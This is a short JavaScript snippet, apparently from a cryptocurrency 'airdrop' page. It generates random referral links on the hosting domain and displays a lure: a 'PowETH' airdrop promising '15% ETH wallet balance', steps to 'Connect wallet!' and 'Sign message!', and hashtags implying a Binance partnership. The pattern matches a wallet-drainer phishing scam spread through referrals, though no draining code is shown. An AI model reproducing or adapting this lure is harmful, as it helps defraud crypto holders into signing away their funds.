function generateUniqueReferralId(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;

    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }

    return result;
}

function generateReferral() {
    return `https://${document.domain}/?ref=${generateUniqueReferralId(16)}`
}

function referralClick() {
    let ref = generateReferral()
    document.getElementById('referralLink').innerHTML = `🔎 AirDrop Name: PowETH`
        + "<br>"
        + `🔯 Referral: <a href="${ref}">${ref}</a>`
        + "<br>"
        + "🎁 Reward: 15% ETH wallet balance"
        + "<br>"
        + "🔘 Connect wallet!"
        + "<br>"
        + "🔘 Sign message!"
        + "<br>"
        + "🔘 Done!"
        + "<br>"
        + "<br>"
        + "#Binance #BinancePartnership #Crypto #airdrop #token #btc #eth #bsc #defi #swap #NFT"
}